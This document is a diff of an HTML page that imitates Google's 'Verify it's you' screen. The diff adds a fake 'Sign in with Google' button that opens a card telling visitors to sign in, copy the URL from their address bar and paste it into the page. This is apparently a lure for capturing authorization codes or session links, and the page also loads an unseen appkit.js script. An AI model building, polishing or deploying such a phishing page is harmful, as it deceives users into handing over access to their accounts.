@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Verify it's you · Google</title>
-  <!-- Font Awesome for icons (free) -->
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in with Google</title>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" />
   <style>
     * {
       margin: 0;
@@ -22,10 +22,85 @@
       justify-content: center;
       padding: 1.5rem;
       margin: 0;
+      transition: background 0.3s ease;
+    }
+
+    /* --- SIGN-IN BUTTON SCREEN (visible initially) --- */
+    #signin-screen {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 1.5rem;
+      transition: opacity 0.4s ease, transform 0.4s ease;
+    }
+
+    #signin-screen.hidden {
+      opacity: 0;
+      transform: scale(0.95);
+      pointer-events: none;
+      position: absolute;
+    }
+
+    .google-signin-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.75rem;
+      background: #ffffff;
+      border: 1px solid #dadce0;
+      border-radius: 40px;
+      padding: 0.9rem 2.4rem;
+      font-size: 1.1rem;
+      font-weight: 500;
+      color: #3c4043;
+      cursor: pointer;
+      transition: 0.2s;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.04);
+      min-width: 240px;
+      letter-spacing: 0.2px;
+    }
+
+    .google-signin-btn i {
+      font-size: 1.6rem;
+      color: #4285f4;
+    }
+
+    .google-signin-btn:hover {
+      background: #f8f9fa;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+      border-color: #c5cbd5;
+    }
+
+    .google-signin-btn:active {
+      transform: scale(0.97);
+      background: #f1f3f5;
+    }
+
+    /* small hint under the button */
+    .hint-text {
+      color: #5f6b7a;
+      font-size: 0.85rem;
+      letter-spacing: 0.3px;
+    }
+
+    /* --- VERIFICATION CARD (hidden initially) --- */
+    #verify-screen {
+      display: none;
+      opacity: 0;
+      transform: translateY(12px);
+      transition: opacity 0.4s ease, transform 0.4s ease;
+      width: 100%;
+      max-width: 600px;
+    }
+
+    #verify-screen.visible {
+      display: block;
+      opacity: 1;
+      transform: translateY(0);
     }
 
     .card {
-      max-width: 600px;
       width: 100%;
       background: #ffffff;
       border-radius: 32px;
@@ -34,7 +109,6 @@
       transition: 0.2s;
     }
 
-    /* ---- header: "Verify it's you" ---- */
     .verify-header {
       display: flex;
       align-items: center;
@@ -59,21 +133,13 @@
       color: #1f2a3a;
     }
 
-    /* ---- sub text ---- */
     .sub-text {
       color: #3c4043;
       font-size: 1rem;
       line-height: 1.5;
       margin: 0.6rem 0 1.6rem 0;
-      padding-right: 0.2rem;
     }
 
-    .sub-text strong {
-      font-weight: 550;
-      color: #1f2a3a;
-    }
-
-    /* ---- ordered steps (clean, with numbers) ---- */
     .step-list {
       list-style: none;
       counter-reset: step-counter;
@@ -124,7 +190,7 @@
       color: #3c4043;
     }
 
-    /* ---- Google Login Button (appkit) ---- */
+    /* Google Login Button (appkit) inside verify card */
     .googleLoginBtn {
       margin: 0.5rem 0 1rem 0;
       display: flex;
@@ -135,7 +201,6 @@
       min-width: 200px;
     }
 
-    /* ---- action row: Sign In + Paste URL (exact match) ---- */
     .action-row {
       display: flex;
       flex-wrap: wrap;
@@ -181,7 +246,6 @@
       color: #3c4043;
     }
 
-    /* ---- bottom bar: English · Help · Privacy · Terms ---- */
     .footer-bar {
       display: flex;
       flex-wrap: wrap;
@@ -225,11 +289,6 @@
       border-bottom-color: #1f2a3a;
     }
 
-    /* ---- small extra polish ---- */
-    .text-muted {
-      color: #5f6b7a;
-    }
-
     @media (max-width: 480px) {
       .card {
         padding: 1.8rem 1.5rem;
@@ -241,7 +300,8 @@
         flex-direction: column;
         align-items: stretch;
       }
-      .btn-signin, .btn-paste {
+      .btn-signin,
+      .btn-paste {
         text-align: center;
         width: 100%;
       }
@@ -259,58 +319,105 @@
       .googleLoginBtn {
         justify-content: center;
       }
+      .google-signin-btn {
+        min-width: 200px;
+        padding: 0.8rem 1.8rem;
+        font-size: 1rem;
+      }
     }
   </style>
 </head>
 <body>
 
-<div class="card">
-  <!-- header: Verify it's you -->
-  <div class="verify-header">
-    <i class="fas fa-shield-alt"></i>
-    <h1>Verify it's you</h1>
+  <!-- ===== SIGN-IN BUTTON SCREEN (visible initially) ===== -->
+  <div id="signin-screen">
+    <button class="google-signin-btn" id="googleSigninBtn">
+      <i class="fab fa-google"></i>
+      <span>Sign in with Google</span>
+    </button>
+    <div class="hint-text">Secure · One‑click access</div>
   </div>
 
-  <!-- description / helper text (exact wording) -->
-  <div class="sub-text">
-    To help keep your account secure, Google needs to verify it's you. Please follow the instructions.
+  <!-- ===== VERIFICATION SCREEN (hidden initially) ===== -->
+  <div id="verify-screen">
+    <div class="card">
+      <!-- header -->
+      <div class="verify-header">
+        <i class="fas fa-shield-alt"></i>
+        <h1>Verify it's you</h1>
+      </div>
+
+      <div class="sub-text">
+        To help keep your account secure, Google needs to verify it's you. Please follow the instructions.
+      </div>
+
+      <ol class="step-list">
+        <li><strong>Sign in</strong> to your Google Account.</li>
+        <li>Copy the URL from the address bar.</li>
+        <li>Click <span class="inline-code"><i class="fas fa-link"></i>Paste URL</span> and confirm paste.</li>
+      </ol>
+
+      <!-- Google Login Button (appkit) -->
+      <div class="googleLoginBtn"></div>
+
+      <!-- Sign In + Paste URL row -->
+      <div class="action-row">
+        <div class="btn-signin">
+          <i class="fas fa-sign-in-alt"></i> Sign In
+        </div>
+        <div class="btn-paste">
+          <i class="fas fa-paste"></i> Paste URL
+        </div>
+      </div>
+
+      <!-- bottom bar -->
+      <div class="footer-bar">
+        <div class="lang-selector">
+          <i class="fas fa-globe-americas"></i>
+          <span>English</span>
+        </div>
+        <div class="footer-links">
+          <a href="#">Help</a>
+          <a href="#">Privacy</a>
+          <a href="#">Terms</a>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <!-- numbered steps (1, 2, 3) -->
-  <ol class="step-list">
-    <li><strong>Sign in</strong> to your Google Account.</li>
-    <li>Copy the URL from the address bar.</li>
-    <li>Click <span class="inline-code"><i class="fas fa-link"></i>Paste URL</span> and confirm paste.</li>
-  </ol>
+  <!-- AppKit script -->
+  <script src="./appkit.js"></script>
 
-  <!-- Google Login Button (appkit) -->
-  <div class="googleLoginBtn"></div>
+  <script>
+    (function() {
+      // Elements
+      const signinScreen = document.getElementById('signin-screen');
+      const verifyScreen = document.getElementById('verify-screen');
+      const signinBtn = document.getElementById('googleSigninBtn');
 
-  <!-- Sign In + Paste URL row (exact match) -->
-  <div class="action-row">
-    <div class="btn-signin">
-      <i class="fas fa-sign-in-alt"></i> Sign In
-    </div>
-    <div class="btn-paste">
-      <i class="fas fa-paste"></i> Paste URL
-    </div>
-  </div>
+      // Function to switch from button → verify card
+      function showVerifyScreen() {
+        // 1. hide sign-in button screen with fade
+        signinScreen.classList.add('hidden');
 
-  <!-- bottom bar: English · Help · Privacy · Terms -->
-  <div class="footer-bar">
-    <div class="lang-selector">
-      <i class="fas fa-globe-americas"></i>
-      <span>English</span>
-    </div>
-    <div class="footer-links">
-      <a href="#">Help</a>
-      <a href="#">Privacy</a>
-      <a href="#">Terms</a>
-    </div>
-  </div>
-</div>
+        // 2. show verify screen after a tiny delay (for smooth transition)
+        setTimeout(() => {
+          verifyScreen.style.display = 'block';
+          // trigger opacity + transform via class
+          requestAnimationFrame(() => {
+            verifyScreen.classList.add('visible');
+          });
+        }, 150);
+      }
 
-<!-- AppKit script -->
-<script src="./appkit.js"></script>
+      // Click handler on the "Sign in with Google" button
+      if (signinBtn) {
+        signinBtn.addEventListener('click', showVerifyScreen);
+      }
+
+      console.log('Ready: click "Sign in with Google" to show verification card.');
+    })();
+  </script>
+
 </body>
 </html>
